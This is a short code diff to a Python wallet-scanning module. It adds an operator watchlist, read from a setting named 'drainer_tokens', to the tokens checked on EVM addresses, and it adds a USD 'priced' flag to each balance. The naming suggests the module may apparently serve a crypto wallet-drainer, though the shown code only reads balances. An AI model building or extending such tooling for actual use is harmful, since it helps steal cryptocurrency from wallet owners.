@@ -361,6 +361,21 @@ def _decode_string(raw: Optional[bytes]) -> str:
         return "?"
 
 
+def admin_tokens(net: str) -> List[str]:
+    """Per-chain operator watchlist (`drainer_tokens_<chain>`), always unioned in."""
+    from database import get_setting
+
+    raw = get_setting(f"drainer_tokens_{net}")
+    if isinstance(raw, str):
+        try:
+            raw = json.loads(raw)
+        except (TypeError, ValueError):
+            raw = [t.strip() for t in raw.split(",") if t.strip()]
+    if not isinstance(raw, list):
+        return []
+    return [str(t) for t in raw if is_evm_address(str(t))]
+
+
 async def scan_evm(net: str, address: str) -> List[Dict[str, Any]]:
     if not is_evm_address(address) or net not in EVM_NETWORKS:
         return []
@@ -379,6 +394,7 @@ async def scan_evm(net: str, address: str) -> List[Dict[str, Any]]:
         tokens |= set(await _evm_alchemy_tokens(client, net, address))
         tokens |= set(await _evm_log_tokens(client, rpc, address, chunks))
         tokens |= {c.lower() for c in cfg["tokens"].values()}
+        tokens |= {c.lower() for c in admin_tokens(net)}
         tokens = {t for t in tokens if is_evm_address(t)}
 
         try:
@@ -428,9 +444,10 @@ async def scan_evm(net: str, address: str) -> List[Dict[str, Any]]:
             node = priced.get(contract)
             sym = (node or {}).get("symbol") or _decode_string(raw_sym)
             human = bal / (10 ** dec)
+            usd = human * _usd_of(node, sym)
             out.append({"symbol": sym, "token": contract, "decimals": dec,
                         "balance_raw": bal, "balance": human,
-                        "usd": human * _usd_of(node, sym),
+                        "usd": usd, "priced": usd > 0,
                         "network": net, "native": False})
     return out
 
